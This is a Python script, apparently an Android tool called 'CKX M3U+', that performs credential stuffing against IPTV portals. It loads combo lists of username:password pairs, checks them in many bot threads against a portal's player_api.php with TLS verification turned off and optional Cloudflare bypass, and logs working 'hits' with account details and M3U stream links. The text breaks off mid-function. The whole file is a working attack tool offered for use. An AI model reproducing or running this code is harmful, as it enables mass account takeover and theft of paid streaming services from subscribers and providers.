# -*- coding: utf-8 -*-
import os, pip
try:
    import requests
except:
    print('requests modulo errors\n')
    pip.main(['install', 'requests'])
    import requests

import sys

def clear_screen():
    os.system('clear')


clear_screen()
import random, time, datetime, subprocess, json, sys, re, pathlib, threading
hits = '/sdcard/hits/'
import os
if not os.path.exists(hits):
    os.mkdir(hits)

    
    
    
time_ = time.localtime()
current_time = time.strftime('%d-%m-%y - %H:%M:%S', time_)
hora_ini = time.strftime('%H:%M:%S', time_)
requests.packages.urllib3.disable_warnings
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256'
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
mac = ''
try:
        import cfscrape
        sesq = requests.Session()
        ses = cfscrape.create_scraper(sess=sesq)
except:
        ses = requests.Session()

try:
        import androidhelper as sl4a
        ad = sl4a.Android()
except:
        pass

pattern = '(^\\S{2,}:\\S{2,}$)|(^.*?(\n|$))'
print('\33[H\33[J', end='')
say = 0
hit = 0
bul = 0
cpm = 1
ckwizboss = ''
clear_screen()
ckwizboss = '\n\33[33m \n ░▒█▀▀▀█░▒█▀▀█░▀▄░▄▀░▒█▀▄▀█░█▀▀█░▒█░▒█░░░░       \n ░░▀▀▀▄▄░▒█▄▄█░░▒█░░░▒█▒█▒█░░▒▀▄░▒█░▒█░▄█▄        \n ░▒█▄▄▄█░▒█░░░░▄▀▒▀▄░▒█░░▒█░█▄▄█░░▀▄▄▀░░▀░        \n  ╔══════════════════════════════════╗\n  ║PREMIUM CONFIG BY CKGROUP X CKWIZ ║\n  ╚══════════════════════════════════╝\n  ╔══════════════════════════════════╗\n  ║  [⚔️]DEVLOPER  [🛡️]CKGROUP         ║\n  ║  [⚔️]TOOLNAME  [🛡️]CKX M3U+        ║\n  ║  [⚔️]REL DATE  [🛡️]9/1/23          ║\n  ║  [⚔️]CATEGORY  [🛡️]IPTV            ║\n  ╚══════════════════════════════════╝\n\33[0m '
print(ckwizboss)
nick = str(input('\33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33mENTER YOUR NICKNAME...\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mNICK:\33[0m\33[1;90m '))
if nick == '':
    nick = 'CK'
print('\33[0m')
clear_screen()
print(ckwizboss)
hitname = str(input('\33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33mNAME THE HIT FILE...\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mHIT:\33[0m\33[1;90m '))
print('\33[0m ')
clear_screen()
print(ckwizboss)
say = 0
dsy = ''
dir = '/sdcard/combo/'
for files in os.listdir(dir):
    say = say + 1
    dsy = dsy + '\33[1;33m┃\33[0m\33[1;91m[ \33[0m' + str(say) + '\33[1;91m ]\33[0m \33[1;90m' + files + '\n\33[0m'
print('\33[1;91m[ \33[0m!\33[1;91m ]\33[0m\33[1;33mSELECT YOUR COMBO FROM THE LIST...\33[0m\n\33[1;33m┏━━━━━━━━━━━━━━━━━━━━━━[CK]\33[31m \t \33[0m\n' + dsy + '\33[1;33m┗━━━━━━━━━━━━━━━━━━━━━━[CK]\33[31m\33[0m\n\33[1;91m[ \33[0m!\33[1;91m ]\33[0m\33[1;33mYOU HAVE ' + str(say) + ' COMBOS \33[0m\33[1;31m\n\n')
dsyno = str(input('\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mCOMBO NO: \33[0m\33[0m'))
say = 0
for files in os.listdir(dir):
    say = say + 1
    if dsyno == str(say):
        dosyaa = dir + files
        break
say = 0
print('\33[0m ')
    
clear_screen()
print(ckwizboss)
print(dosyaa)
botsay = input('\n\33[1;91m[ \33[0m!\33[1;91m ]\33[0m\33[1;33mCHOOSE THE NUMBER OF BOTS\33[0m\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mBᴏᴛs:\33[0m\33[1;33m')
botsay = int(botsay)
HEADERd = {
     'Cookie': "'stb_lang=pt-BR; timezone=America%2FSao_Paulo;'", 
     'X-User-Agent': "'Model: MAG254; Link: Ethernet'", 
     'Connection': "'Keep-Alive'", 
     'Accept-Encoding': "'gzip, deflate'", 
     'Accept': "'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'", 
     'User-Agent': "'Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro; ANE-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'"}
dsy = dosyaa
combo = dsy
dosya = ''
file = pathlib.Path(dsy)
if file.exists():
    print('\33[1;91m[ \33[0m!\33[1;91m ]\33[0m\33[1;31mFILE FOUND!!!')
else:
    print('\33[1;91m[ \33[0m!\33[1;91m ]\33[0m\33[1;91mNO FILE FOUND!!!')
    dosya = 'ckboss'
if dosya == 'ckboss':
    exit()
c = open(dsy, 'r')
totLen = c.readlines()
uz = len(totLen)
print('\33[0m ')
clear_screen()
print(ckwizboss)
print('\33[1;91mʙᴏᴛ:' + str(botsay))
dir = '/sdcard/hits/'
print('\n\33[1;90mChoosen : ' + dsy)
panel = input('\n\33[1;91m[ \33[0m!\33[1;91m ]\33[0m\33[1;33mENTER YOUR PORTAL URL\33[0m\n\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mPortal = \33[1;33m ')
panel = panel.replace('http://', '')
panel = panel.replace('/c', '')
panel = panel.replace('/', '')
portal = panel
fx = portal.replace(':', '_')
dosyaa = dosyaa.replace('/sdcard/combo/', '')
dosyaa = dosyaa.replace('.txt', '')
dosy = dosyaa
dosyaaa = dosy.replace('/', '')
clear_screen()
print('\33[0m ')
kanall = ''
kanall = input('\n\33[33m \n ░▒█▀▀▀█░▒█▀▀█░▀▄░▄▀░▒█▀▄▀█░█▀▀█░▒█░▒█░░░░\n ░░▀▀▀▄▄░▒█▄▄█░░▒█░░░▒█▒█▒█░░▒▀▄░▒█░▒█░▄█▄\n ░▒█▄▄▄█░▒█░░░░▄▀▒▀▄░▒█░░▒█░█▄▄█░░▀▄▄▀░░▀░\n  ╔══════════════════════════════════╗\n  ║PREMIUM CONFIG BY CKGROUP X CKWIZ ║\n  ╚══════════════════════════════════╝\33[0m \n\33[1;31m include Categories list? \33[1;33m ?\n 1\33[1;91m➪  \33[32m \33[1;33mYes  \33[32m\n 2\33[1;91m➪ \u200b\u200b \33[32m \33[1;33mNo   \33[32m\n\33[1;33m SELECTION =\33[1;31m')
if not kanall == '1':
    kanall = 2
clear_screen()
print(ckwizboss)
def CATEGORIAS(katelink):
    try:
        res = ses.get(katelink, headers=HEADERd, timeout=15, verify=False)
        veri = ''
        kate = ''
        veri = str(res.text)
        for i in veri.split('category_name":"'):
            kate = kate + '««✦»»' + str(i.split('"')[0].encode('utf-8').decode('unicode-escape')).replace('\\/', '/')

    except:
        pass

    return kate


def onay(veri, user, pas):
    status = veri.split('status":')[1]
    status = status.split(',')[0]
    status = status.replace('"', '')
    katelink = 'http://' + panel + '/player_api.php?username=' + user + '&password=' + pas + '&action=get_live_categories'
    sound = '/sdcard/sound/Tiro.mp3'
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass

    acon = ''
    acon = veri.split('active_cons":')[1]
    acon = acon.split(',')[0]
    acon = acon.replace('"', '')
    mcon = veri.split('max_connections":')[1]
    mcon = mcon.split(',')[0]
    mcon = mcon.replace('"', '')
    timezone = veri.split('timezone":"')[1]
    timezone = timezone.split('",')[0]
    timezone = timezone.replace('\\/', '/')
    realm = veri.split('url":')[1]
    realm = realm.split(',')[0]
    realm = realm.replace('"', '')
    port = veri.split('port":')[1]
    port = port.split(',')[0]
    port = port.replace('"', '')
    user = veri.split('username":')[1]
    user = user.split(',')[0]
    user = user.replace('"', '')
    passw = veri.split('password":')[1]
    passw = passw.split(',')[0]
    passw = passw.replace('"', '')
    bitis = veri.split('exp_date":')[1]
    bitis = bitis.split(',')[0]
    bitis = bitis.replace('"', '')
    if bitis == 'null':
        bitis = 'Uɴʟɪᴍɪᴛᴇᴅ'
    else:
        bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime('%d-%m-%Y %H:%M:%S')
    bitis = bitis
    if kanall == '1':
        try:
            CATEGORIAS = ''
            res = ses.get(katelink, headers=HEADERd, timeout=15, verify=False)
            veri = ''
            kate = ''
            veri = str(res.text)
            for i in veri.split('category_name":"'):
                kate = kate + '««✦»»' + str(i.split('"')[0].encode('utf-8').decode('unicode-escape')).replace('\\/', '/')

            CATEGORIAS = kate
        except:
            pass

    url5 = 'http://' + panel + '/player_api.php?username=' + user + '&password=' + pas + '&action=get_live_streams'
    try:
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        kanalsayisi = ''
        kanalsayisi = str(veri.count('stream_id'))
        url5 = 'http://' + panel + '/player_api.php?username=' + user + '&password=' + pas + '&action=get_vod_streams'
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        filmsayisi = str(veri.count('stream_id'))
        url5 = 'http://' + panel + '/player_api.php?username=' + user + '&password=' + pas + '&action=get_series'
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        dizisayisi = str(veri.count('series_id'))
    except:
        pass

    m3ulink = 'http://' + panel + '/get.php?username=' + user + '&password=' + pas + '&type=m3u_plus'
    sayi = ''
    mt = '                                 \n ╭── ≼ ⟬ꜱᴄᴀɴɴᴇʀ⟭ ≽ SPX M3U+ Scanner #CK\n•[🛡]• ≼ ⟬ᴅᴀᴛᴇ⟭ ≽' + str(time.strftime('%d-%m-%Y')) + '\n•[🛡]• ≼ ⟬ʜᴏꜱᴛ⟭ ≽  http://' + portal + '\n•[🛡]• ≼ ⟬ʀᴇᴀʟ⟭ ≽  http://' + realm + '\n•[🛡]• ≼ ⟬ᴘᴏʀᴛ⟭ ≽  ' + port + '\n•[🛡]• ≼ ⟬ᴜꜱᴇʀ⟭ ≽  ' + user + '\n•[🛡]• ≼ ⟬ᴘᴀꜱꜱ⟭ ≽  ' + pas + '\n•[🛡]• ≼ ⟬ᴇxᴘ⟭ ≽  ' + bitis + '\n•[🛡]• ≼ ⟬ᴀᴄᴛ ᴄᴏɴ⟭ ≽  ' + acon + '\n•[🛡]• ≼ ⟬ᴍᴀx ᴄᴏɴ⟭ ≽  ' + mcon + ' \n•[🛡]• ≼ ⟬ꜱᴛᴀᴛᴜꜱ⟭ ≽  ' + status + '\n•[🛡]• ≼ ⟬ᴛɪᴍᴇᴢᴏɴᴇ⟭ ≽  ' + timezone + ' '
    if not kanalsayisi == '':
        sayi = '\n•[🛡]• ≼ ⟬ɴᴏ ᴏꜰ ᴄʜᴀɴɴᴇʟꜱ⟭ ≽  ' + kanalsayisi + '\n•[🛡]• ≼ ⟬ɴᴏ ᴏꜰ ꜰɪʟᴍꜱ⟭ ≽   ' + filmsayisi + '\n•[🛡]• ≼ ⟬ɴᴏ ᴏꜰ ꜱᴇʀɪᴇꜱ⟭ ≽ ' + dizisayisi + '\n ╰── ≼ ⟬ʜɪᴛꜱ ʙʏ⟭ ≽  ' + str(nick) + '\n'
    imzak = ''
    if kanall == '1':
        imzak = '\n•[🛡]• ≼ ⟬LIVE LIST⟭ ≽' + str(CATEGORIAS) + '\n\n'
    mtl = '\n•[🛡]• ≼ ⟬M3U⟭ ≽ ' + m3ulink + '\n'
    yaz(mt + sayi + mtl + imzak + '\n')


clear_screen()

def yaz(kullanici):
    dosya = open(('/sdcard/hits/SPXm3u+_' + str(hitname) + '_' + fx + '.txt'), 'a+', encoding='utf-8')
    dosya.write(kullanici)
    dosya.close()


cpm = 0

def echox(user, pas, bot, fyz, oran, hit):
    global cpm
    global hora_ini
    cpmx = time.time() - cpm
    cpmx = round(60 / cpmx)
    if str(cpmx) == '0':
        cpm = cpm
    else:
        cpm = cpmx
    time_ = time.localtime()
    timex = time.time()
    echo = '\33[33m \n ░▒█▀▀▀█░▒█▀▀█░▀▄░▄▀░▒█▀▄▀█░█▀▀█░▒█░▒█░░░░       \n ░░▀▀▀▄▄░▒█▄▄█░░▒█░░░▒█▒█▒█░░▒▀▄░▒█░▒█░▄█▄        \n ░▒█▄▄▄█░▒█░░░░▄▀▒▀▄░▒█░░▒█░█▄▄█░░▀▄▄▀░░▀░        \n  ╔══════════════════════════════════╗  \n  ║PREMIUM CONFIG BY CKGROUP/ CKIPTV ║\n  ╚══════════════════════════════════╝  \n\33[0m  \33[38;5;240m\n ╭•••• ≼ ⟬SPX M3U+ SCRIPT BY CKIPTV⟭ ≽  \33[0m \33[38;5;240m\n•[🛡]•\33[38;5;240m ≼ ⟬SCANNING STARTED⟭ ≽ ' + hora_ini + '\n•[🛡]•\33[38;5;240m ≼ ⟬CURRENT TIME⟭ ≽ ' + str(time.strftime('%H:%M:%S')) + '\n•[🛡]•\33[38;5;240m ≼ ⟬PORTAL⟭ ≽\33[31m ' + portal + ' \33[0m \33[38;5;240m\n•[🛡]•\33[38;5;240m ≼ ⟬USERNAME⟭ ≽\33[36m ' + user + '\33[0m \33[38;5;240m\n•[🛡]•\33[38;5;240m ≼ ⟬PASSWORD⟭ ≽ \33[36m' + pas + '\33[0m \33[38;5;240m\n•[🛡]•\33[38;5;240m ≼ ⟬CPM⟭ ≽ ' + str(cpm) + '\n•[🛡]•\33[38;5;240m ≼ ⟬BOT⟭ ≽ ' + str(bot) + '\n•[🛡]•\33[38;5;240m ≼ ⟬TOTAL⟭ ≽ ' + str(fyz) + ' of ' + str(uz) + '\n•[🛡]•\33[38;5;240m ≼ ⟬WORKDONE⟭ ≽ ' + str(oran) + ' %\n ╰•••• ≼ ⟬https://github.com/ckwiz⟭ ≽      \n  \33[0m \33[32m \n    _/﹋\\_        \n    (҂`_´)  \n  <--︻╦╤──҉ - ─҉  ➤  \33[36m ' + str(hit) + ' \33[32m \n     \\﹏/\n     /﹋\\_     \33[0m  \n\n\33[38;5;240m ╭•••  ≼ ⟬HELLO⟭ ≽\33[93m ' + str(nick) + '\n\33[38;5;240m•[🛡]• ≼ ⟬BOTS⟭ ≽\33[95m ' + str(botsay) + '\n\33[38;5;240m•[🛡]• ≼ ⟬COMBO⟭ ≽\33[31m ' + dosyaaa + ' \n\33[38;5;240m•[🛡]• ≼ ⟬LISTS⟭ ≽ \33[36m' + str(uz) + ' \n\33[38;5;240m ╰•••  ≼ ⟬MODE⟭ ≽ SPX Fast Mode\n                                                           \33[0m   '
    print(echo)
    cpm = time.time()

hit = 0

def d1():
    global hit
    say = 0
    for fyz in range(1, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '01'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d2():
    global hit
    say = 0
    for fyz in range(2, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '02'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d3():
    global hit
    say = 0
    for fyz in range(3, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '03'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d4():
    global hit
    say = 0
    for fyz in range(4, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '04'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d5():
    global hit
    say = 0
    for fyz in range(5, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '05'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d6():
    global hit
    say = 0
    for fyz in range(6, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '06'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d7():
    global hit
    say = 0
    for fyz in range(7, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '07'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d8():
    global hit
    say = 0
    for fyz in range(8, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '08'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d9():
    global hit
    say = 0
    for fyz in range(9, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '09'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d10():
    global hit
    say = 0
    for fyz in range(10, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '10'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d11():
    global hit
    say = 0
    for fyz in range(11, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '11'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d12():
    global hit
    say = 0
    for fyz in range(12, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '12'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d13():
    global hit
    say = 0
    for fyz in range(13, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '13'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d14():
    global hit
    say = 0
    for fyz in range(14, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '14'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
